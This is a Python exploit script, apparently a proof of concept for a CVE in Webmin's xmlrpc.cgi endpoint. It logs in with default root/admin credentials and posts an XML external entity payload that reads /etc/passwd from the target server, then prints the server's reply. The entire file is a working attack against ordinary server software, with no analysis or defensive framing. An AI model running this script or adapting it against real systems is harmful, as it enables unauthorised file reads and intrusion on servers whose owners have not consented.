import base64
import sys
import requests
import argparse


def cve(url, user, password):
    vulnerable_url = url + "/xmlrpc.cgi"
    headers = {
        'Accept-Encoding': "gzip, deflate",
        'Host': '192.168.0.202:10000',
        'Referer': "%s/session_login.cgi" % url,
        'Accept': "*/*",
        'Accept-Language': "en",
        'Authorization': "Basic %s" % base64.b64encode((user + ":" + password).encode('ascii')).decode(),
        'User-Agent': "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
        'Connection': "close",
        'Cookie': "redirect=1; testing=1; sid=x; sessiontest=1",
        'Content-Type': "application/x-www-form-urlencoded",
    }
    payload = '<?xml version="1.0" encoding="utf-8"?> \
                <!DOCTYPE methodCall [ \
                    <!ENTITY file SYSTEM "file:///etc/passwd"> \
                    \
                    ]>\
                <methodCall>\
                    <methodName>&file;</methodName>\
                </methodCall>'

    r = requests.post(url=vulnerable_url, headers=headers, data=payload, verify=False)
    print(r.content.decode())
    r.close()


parser = argparse.ArgumentParser()
parser.add_argument('--ip', type=str, help="Server IP Address", required=True)
parser.add_argument("--port", type=int, default=10000)
parser.add_argument("--user", type=str, default="root")
parser.add_argument("--password", type=str, default="admin")
options = parser.parse_args(args=sys.argv[1:])

cve("https://" + options.ip + ":" + str(options.port), options.user, options.password)
